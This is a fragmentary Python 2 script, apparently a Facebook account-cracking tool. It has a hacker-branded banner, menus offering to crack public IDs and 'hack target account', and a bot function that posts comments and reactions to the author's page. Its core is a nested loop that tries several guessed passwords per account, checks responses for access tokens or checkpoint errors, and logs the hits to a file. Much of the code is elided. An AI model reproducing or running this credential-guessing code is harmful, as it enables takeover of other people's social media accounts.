...
"""
print  """
\033[1;92m💀─────(CYBER_CRACK_OF_FACEBOOK)─────💀
...
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m{★} \x1b[1;97mUSERNAME \x1b[1;96m>>>> ")
...
def bot_komen():
    ...
    una = 'https://www.facebook.com/Riaz-hacker-100835532473815/'
    kom = 'well come to RIAZ KHAN👋😆'
    reac = 'ANGRY'
    post = 'https://www.facebook.com/Riaz-hacker-100835532473815/'
    post2 = 'https://www.facebook.com/Riaz-hacker-100835532473815/'
    kom2 =  '⚰⚰🔩😒🔩😒🔩😒🔩😒🔩😒🔩😒❌😬👋🍛'
    reac2 = 'LOVE💉💉💉💉🚫🚫❌❌❌❌❌❌'
...
def menu():
	...
	print "\033[1;97m[ × ] ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 
	print "\033[1;97m[ 1 ] Star Cracking"
...
def super():
	...
	print "\033[1;97m[ 2 ] Crack Dari ID Publik"
	print "\033[1;97m[ 3 ] Hack Akun Target"
	print "\033[1;97m[ 4 ] Back"
	print
	pilih_super()
...
def pilih_super():
	...
	if peak =="":
		...
		try:
			...
			print"\033[1;96m{×} Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					print'{×}' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							print'{×}' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									print'{×}' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											print'{×}' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													print '{×}' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass6
													cek = open("out/checkpoint.txt", "a")
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["error_msg"]:
																	...
																	print'{×}' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
